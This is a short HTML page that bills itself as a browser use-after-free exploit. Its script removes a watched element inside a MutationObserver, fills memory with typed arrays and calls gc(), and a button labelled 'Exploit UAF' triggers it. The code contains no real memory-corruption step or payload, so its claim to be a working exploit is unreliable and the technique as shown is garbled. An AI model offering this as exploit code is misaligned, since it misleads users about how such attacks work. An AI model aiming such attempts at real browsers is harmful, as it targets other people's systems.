<!DOCTYPE html>
<html>
<head>
    <script>
        function exploitUAF() {
            let node = document.createElement("div");
            document.body.appendChild(node);

            let observer = new MutationObserver(() => {
                try {
                    let cached = document.querySelector("div");
                    console.log(cached.innerHTML);
                } catch (e) {
                    console.error(e.message);
                    alert(e.message);
                }
            });

            observer.observe(document.body, { childList: true, subtree: true });
            document.body.removeChild(node); // تعديل أثناء الملاحظة
            let memoryHog = new Array(10000);
            for (let i = 0; i < 10000; i++) {
                memoryHog[i] = new Uint8Array(2048);
            }
            if (typeof gc === "function") gc();
        }
    </script>
</head>
<body>
    <button onclick="exploitUAF()">Exploit UAF</button>
</body>
</html>